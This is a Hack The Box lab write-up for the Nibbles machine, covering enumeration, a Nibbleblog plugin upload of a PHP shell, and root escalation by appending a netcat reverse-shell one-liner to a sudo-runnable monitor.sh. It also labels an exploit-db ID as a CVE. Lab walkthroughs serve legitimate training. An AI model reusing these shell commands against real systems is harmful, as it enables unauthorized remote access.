# Nibbles HTB, IP 10.10.10.75

# Initial Enumeration

**1. nmap -sC -sV  10.10.10.75**

![ni1](https://user-images.githubusercontent.com/15195048/93920478-18516b00-fcc4-11ea-9dc6-b7a557907a7f.png)

**2. Dirbuster/ Gobuster**

**gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.75/nibbleblog**

**dirb http://10.10.10.75/nibbleblog -X .php,.bit,.html,.sh**

![ni2](https://user-images.githubusercontent.com/15195048/93920481-19829800-fcc4-11ea-91f1-497e9b80909e.png)

-------------------------------------------------------------------------------------------------------------------------------
# Port Enumeration

## 1. Enumerating on port 80

![ni3](https://user-images.githubusercontent.com/15195048/93920485-19829800-fcc4-11ea-9cb1-1c6c5138dc6f.png)

View page source: **Control +U**
 
 
 ![ni4](https://user-images.githubusercontent.com/15195048/93920486-1a1b2e80-fcc4-11ea-830f-777f002a8595.png)


**Interesting Files**

http://10.10.10.75/nibbleblog/
 
 After searching  Nibbleblog it is a powerful engine for creating blogs. 
 
**searchsploit nibbleblog**

 ![ni5](https://user-images.githubusercontent.com/15195048/93920487-1a1b2e80-fcc4-11ea-95f6-8f943e0d60ac.png)


http://localhost/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image
Upload PHP shell, ignore warnings
Visit
http://localhost/nibbleblog/content/private/plugins/my_image/image.php.
Done, we have an unprivileged shell!!



![ni6](https://user-images.githubusercontent.com/15195048/93920488-1ab3c500-fcc4-11ea-8a66-bb1afd8b31d6.png)


**Interactive shell**
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color

user.txt

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
## 1.Privilege Escalation monitor.sh file

**sudo -l**


![ni7](https://user-images.githubusercontent.com/15195048/93920490-1ab3c500-fcc4-11ea-8a93-ad8578fe8582.png)

![ni8](https://user-images.githubusercontent.com/15195048/93920492-1b4c5b80-fcc4-11ea-84f7-8167da0ea2f1.png)

**unzip personal.zip**

![ni9](https://user-images.githubusercontent.com/15195048/93920494-1b4c5b80-fcc4-11ea-8f95-2e5c6dd713ea.png)

**Notes:**
When we see a back up file we first look at permissions and potential vulnerarle code. Then we google the file in order to find more info.
If we cannot overwrite the file we could rename it, remove it, zip it or make my own file containing bash, reverse shell.
The concept when a file runs as root is to add code(reverse-shell).

Add a reverse shell to monitor.sh.
**echo “rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacking machine>  4422 > /tmp/f” >> monitor.sh**
 
![ni10](https://user-images.githubusercontent.com/15195048/93920497-1be4f200-fcc4-11ea-92ea-ab147316aa7a.png)


monitor.sh file runs as administrator

**Notes:**
  A System Administrator has to monitor the servers, users, logs, create backup.. For the most repetitive task most of the administrator write a script like monitor.sh to automate their day-to-day repetitive task.
  
## 2.Kernel Exploit
Additionally, this box is vulnerable to a kernel exploit. This monitor.sh file script showed OS Vesion 16.04.3.

![ni11](https://user-images.githubusercontent.com/15195048/93920499-1be4f200-fcc4-11ea-84ac-091e02f26419.png)

  
**CVE ID 44298**
Resource:  https://www.exploit-db.com/exploits/44298

![ni12](https://user-images.githubusercontent.com/15195048/93920500-1c7d8880-fcc4-11ea-9916-d0b886c57533.png)

 
